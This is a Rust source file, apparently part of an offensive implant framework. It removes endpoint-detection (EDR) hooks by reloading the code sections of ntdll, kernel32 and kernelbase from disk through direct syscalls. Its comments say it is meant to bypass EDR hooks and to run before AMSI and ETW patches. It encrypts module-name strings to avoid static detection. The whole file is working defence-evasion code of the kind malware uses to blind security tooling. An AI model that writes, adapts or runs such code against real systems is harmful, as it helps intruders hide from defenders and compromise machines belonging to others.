/// Restores ntdll, kernel32 and kernelbase from their on-disk copies,
/// removing any inline hooks an EDR installed in those modules' code sections.
///
/// Disk reads and section restore both use direct syscall stubs (bypassing any
/// EDR hook on NtCreateFile, NtReadFile, NtProtectVirtualMemory,
/// NtWriteVirtualMemory) with Win32/std fallbacks if stubs are unavailable.
///
/// Must run BEFORE AMSI/ETW patches so the patches land on clean code.
#[cfg(target_os = "windows")]
pub fn unhook_all() {
    unsafe {
        let names = vec![
            oxide_macros::encrypt_str!("ntdll.dll"),
            oxide_macros::encrypt_str!("kernel32.dll"),
            oxide_macros::encrypt_str!("kernelbase.dll"),
        ];
        for name in &names {
            restore_module(name);
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_all() {}

// ── PE helpers ────────────────────────────────────────────────────────────────

#[inline]
fn r16(b: &[u8], off: usize) -> u16 {
    if off + 2 > b.len() { return 0; }
    u16::from_le_bytes([b[off], b[off + 1]])
}

#[inline]
fn r32(b: &[u8], off: usize) -> u32 {
    if off + 4 > b.len() { return 0; }
    u32::from_le_bytes([b[off], b[off + 1], b[off + 2], b[off + 3]])
}

// ── Module restorer ───────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn restore_module(module_name: &str) {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetModuleFileNameW};

    // ── 1. Get the loaded base ────────────────────────────────────────────────
    let name_cstr: Vec<u8> = {
        let mut v = module_name.as_bytes().to_vec();
        v.push(0);
        v
    };
    let hmod = GetModuleHandleA(name_cstr.as_ptr() as _);
    if hmod == 0 { return; }
    let base = hmod as *mut u8;

    // ── 2. Get the full on-disk path from Windows ─────────────────────────────
    let mut path_buf = [0u16; 520];
    let path_len = GetModuleFileNameW(hmod, path_buf.as_mut_ptr(), 520);
    if path_len == 0 { return; }
    let path = String::from_utf16_lossy(&path_buf[..path_len as usize]);

    // ── 3. Read the clean copy from disk via direct NtCreateFile/NtReadFile ──
    //       NT path: \??\ prefix + DOS path (e.g. \??\C:\Windows\System32\ntdll.dll)
    let nt_path = format!("\\??\\{}", path);
    let file = match super::syscall::nt_read_file(&nt_path)
        .or_else(|| std::fs::read(&path).ok()) // fallback: std::fs if stubs unavailable
        .filter(|b| b.len() >= 0x40)
    {
        Some(b) => b,
        None => return,
    };
    // MZ header
    if file[0] != 0x4D || file[1] != 0x5A { return; }

    // ── 4. Parse the PE section table ────────────────────────────────────────
    let e_lfanew = r32(&file, 0x3C) as usize;
    if e_lfanew + 24 > file.len() { return; }
    // PE\0\0 signature
    if file.get(e_lfanew..e_lfanew + 4) != Some(b"PE\0\0") { return; }

    let num_sects = r16(&file, e_lfanew + 6) as usize;
    let opt_sz    = r16(&file, e_lfanew + 20) as usize;
    let sect_base = e_lfanew + 24 + opt_sz;

    // ── 5. Overwrite each executable section ─────────────────────────────────
    for i in 0..num_sects {
        let s = sect_base + i * 40;
        if s + 40 > file.len() { break; }

        let characteristics = r32(&file, s + 36);
        // IMAGE_SCN_CNT_CODE = 0x20 — only restore code sections
        if characteristics & 0x0000_0020 == 0 { continue; }

        let va      = r32(&file, s + 12) as usize; // VirtualAddress
        let raw_sz  = r32(&file, s + 16) as usize; // SizeOfRawData
        let raw_off = r32(&file, s + 20) as usize; // PointerToRawData

        if raw_sz == 0 || raw_off + raw_sz > file.len() { continue; }

        let dst = base.add(va);
        let src = file.as_ptr().add(raw_off);

        // PAGE_EXECUTE_READWRITE = 0x40 — use direct syscall to bypass EDR hooks
        if let Some(old) = super::syscall::nt_virtual_protect(dst, raw_sz, 0x40u32) {
            super::syscall::nt_write_virtual_memory(dst, src, raw_sz);
            super::syscall::nt_virtual_protect(dst, raw_sz, old);
        }
    }
}
